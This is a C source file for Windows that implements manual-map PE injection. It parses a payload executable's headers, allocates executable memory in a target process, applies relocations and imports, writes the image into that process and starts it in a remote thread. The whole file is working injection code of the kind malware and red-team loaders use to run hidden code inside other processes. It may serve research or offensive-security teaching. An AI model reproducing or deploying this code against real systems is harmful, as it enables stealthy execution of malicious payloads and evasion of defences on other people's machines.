#include "inject_pe.h"

#include "../ntdll_undoc.h"

bool run_injected_in_new_thread(HANDLE hProcess, LPVOID remote_code_ep)
{
    NTSTATUS status = NULL;
    //create a new thread for the injected code:
    LPTHREAD_START_ROUTINE routine = (LPTHREAD_START_ROUTINE) remote_code_ep;

    DWORD threadId = NULL;
    HANDLE hMyThread = NULL;
    if ((hMyThread = CreateRemoteThread(hProcess, NULL, NULL, routine, NULL, CREATE_SUSPENDED, &threadId)) == NULL) {
        printf("[ERROR] CreateRemoteThread failed, status : %x\n", GetLastError());
        return false;
    }
    printf("Created Thread, id = %x\n", threadId);
    printf("Resuming added thread...\n");
    ResumeThread(hMyThread); //injected code
    return true;
}

bool inject_PE(HANDLE hProcess, BYTE* payload, SIZE_T payload_size)
{
    if (!load_ntdll_functions()) return false;
    
    bool is64 = is64bit(payload);

    //check payload:
    BYTE* nt_hdr = get_nt_hrds(payload);
    if (nt_hdr == NULL) {
        printf("Invalid payload: %p\n", payload);
        return false;
    }
    ULONGLONG oldImageBase = 0;
    DWORD payloadImageSize = 0;
    ULONGLONG entryPoint = 0;
    if (is64) {
        IMAGE_NT_HEADERS64* payload_nt_hdr = (IMAGE_NT_HEADERS64*)nt_hdr;
        oldImageBase = payload_nt_hdr->OptionalHeader.ImageBase;
        payloadImageSize = payload_nt_hdr->OptionalHeader.SizeOfImage;
        entryPoint = payload_nt_hdr->OptionalHeader.AddressOfEntryPoint;
    }
    else {
        IMAGE_NT_HEADERS32* payload_nt_hdr = (IMAGE_NT_HEADERS32*)nt_hdr;
        oldImageBase = payload_nt_hdr->OptionalHeader.ImageBase;
        payloadImageSize = payload_nt_hdr->OptionalHeader.SizeOfImage;
        entryPoint = payload_nt_hdr->OptionalHeader.AddressOfEntryPoint;
    }
    SIZE_T written = 0;

    LPVOID remoteAddress = VirtualAllocEx(hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteAddress == NULL)  {
        printf("Could not allocate memory in the remote process\n");
        return false;
    }
    printf("Allocated remote ImageBase: %p size: %x\n", remoteAddress,  payloadImageSize);

    //first we will prepare the payload image in the local memory, so that it will be easier to edit it, apply relocations etc.
    //when it will be ready, we will copy it into the space reserved in the target process
    LPVOID localCopyAddress = VirtualAlloc(NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);;
    if (localCopyAddress == NULL) {
        printf("Could not allocate memory in the current process\n");
        return false;
    }
    printf("Allocated local memory: %p size: %x\n", localCopyAddress, payloadImageSize);

    if (!sections_raw_to_virtual(payload, payloadImageSize, (BYTE*)localCopyAddress)) {
        printf("Could not copy PE file\n");
        return false;
    }

    if (!update_image_base((BYTE*)localCopyAddress, remoteAddress)) {
        printf("Could not update image base\n");
        return false;
    }

    printf("remoteAddress = %p\n", remoteAddress);
    //if the base address of the payload changed, we need to apply relocations:
    if ((ULONGLONG) remoteAddress != oldImageBase) {
        if (apply_relocations((ULONGLONG)remoteAddress, oldImageBase, localCopyAddress, payloadImageSize) == false) {
            printf("[ERROR] Could not relocate image!\n");
            return false;
        }
    }

    if (apply_imports(localCopyAddress) == false) {
        printf("[WARNING] Some imports cannot be resolved by loader!\n[!] Payload should resolve remaining imports, or the application will crash!\n");
    }

    // paste the local copy of the prepared image into the reserved space inside the remote process:
    if (!WriteProcessMemory(hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
        printf("[ERROR] Could not paste the image into remote process!\n");
        return false;
    }
    //free the localy allocated copy
    VirtualFree(localCopyAddress, payloadImageSize, MEM_FREE);

    LPVOID newEP = (LPVOID)((ULONGLONG) remoteAddress + entryPoint);
    printf("newEP = %p\n", newEP);
    run_injected_in_new_thread(hProcess, newEP);

    return true;
}
